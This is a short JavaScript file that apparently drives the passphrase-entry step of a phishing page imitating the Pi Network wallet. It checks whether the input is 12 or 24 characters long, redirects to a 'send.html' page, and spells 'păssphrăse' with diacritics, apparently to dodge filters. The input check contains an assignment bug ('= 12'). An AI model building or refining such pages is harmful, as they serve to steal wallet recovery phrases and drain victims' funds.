const inputField = document.getElementById("inputField");
const submitButton = document.getElementById("submitButton");

let xii = 12

inputField.addEventListener("input", function () {
  if ((inputField.value.length = 12)) {
    submitButton.disabled = false;
  } else {
    submitButton.disabled = true;
  }
});

submitButton.addEventListener("click", function () {
  if (inputField.value.length === 12 || inputField.value.length === 24) {
    window.location.href = "../html/send.html";
  } else {
    alert("Invalid! Enter valid păssphrăse to proceed");
  }
});


/*
submitButton.addEventListener("click", function () {
  if (inputField.value.length != 12) {
    alert("Invalid Păssphrăse!, Enter Your 12 words Păssphrăse");
  } else {
    window.location.href = "http://127.0.0.1:3000/pi%20network/html/send.html";
  }
});

const inputField = document.getElementById('inputField');
const submitButton = document.getElementById('submitButton');

inputField.addEventListener('input', function () {
    if (inputField.value.length >= 24) {
        submitButton.disabled = false;
    } else {
        submitButton.disabled = true;
    }
});

submitButton.addEventListener('click', function (event) {
    if (inputField.value.length < 24) {
        event.preventDefault();  // Prevent form submission
        alert("Input must be at least 24 characters long.");
    }
}); */
